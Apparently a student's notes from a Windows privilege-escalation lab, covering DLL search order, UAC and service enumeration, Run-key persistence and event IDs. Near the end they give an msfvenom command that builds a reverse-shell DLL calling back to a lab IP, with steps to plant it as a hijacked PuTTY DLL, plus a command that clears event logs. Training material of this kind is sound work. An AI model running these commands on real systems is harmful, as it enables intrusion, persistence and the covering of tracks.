   
   where /r c:\windows ntoskrnl.exe
   everytime i scp a new file i have to RESTART MACHINE
   
   
   DLL Search Order
    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
    The directory the the Application was run from
    The directory specified in in the C+ function GetSystemDirectory()
    The directory specified in the C+ function GetWindowsDirectory()
    The current directory
    
    Checking UAC settings
    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
    
    
    sigcheck -m 'C:\Windows\System32\calc.exe'
    
    asinvoker is always the user level
    if highestavaliable is in admin group it will run as admin
    
    
   schtasks vulnerable 
schtasks /query /fo LIST /v

DEMO: DLL Hijacking
    Identify Vulnerability
    Take advantage of the default search order for DLLs
    NAME_NOT_FOUND present in executableâ€™s system calls
    Validate permissions
    Create and transfer Malicious DLL

Finding Vulnerable Services
wmic service list full
sc query


HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\
HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\
Run, Run once

Persistance
System changes or binary uploads that provide the adversary continued access to system
Survives:
    Reboots
    Credential changes
    DHCP IP reassignment
    Etc.

Considerations include:
    File naming
    File location
    Timestomping
    Port selection


Microsoft Event ID
4624/4625
Successful/failed login

4720
Account created

4672
Administrative user logged on

7045
Service created



wevtutil el
wmic ntevent where "logfile="<LOGNAME>" list full
Get-Eventlog -List


Determine if logging is set (PowerShell and WMIC)
reg query [hklm or hkcu]\software\policies\microsoft\windows\powershell
reg query hklm\software\microsoft\wbem\cimom \| findstr /i logging
# 0 = no | 1 = errors | 2 = verbose

Clear-Eventlog -Log Application, System
=======================================================================================

schtasks /query /fo  List /v | Select-String -Pattern "Task to Run" -CaseSensitive -context 0,6 | Select-String -Pattern "COM handler" -NotMatch

sigcheck C:\Users\student\Exercise\PuTTY\putty.exe

icalcs "C:\Users\student\Exercise\Putty\

procmon

processname contains putty.exe
path contain .dll
result contains NAME NOT FOUND


msfvenom -p windows/shell_reverse_tcp LHOST=10.50.25.239 LPORT=4444 -f dll > badd.dll
msfvenom -p windows/exec CMD="cmd.exe /C whoami > C:\\whoami.txt" -f dll > bad.dll
this syntax works _- 
then scp it to windows. 

when putty is ran this will reach out to us (LINOPS)

scp student@10.50.25.239:/home/student/bad.dll . 

rename dll to the vulnerable original dll

cipy C:\Users\student\bad.dll "C:\users\student\exercise\putty\"

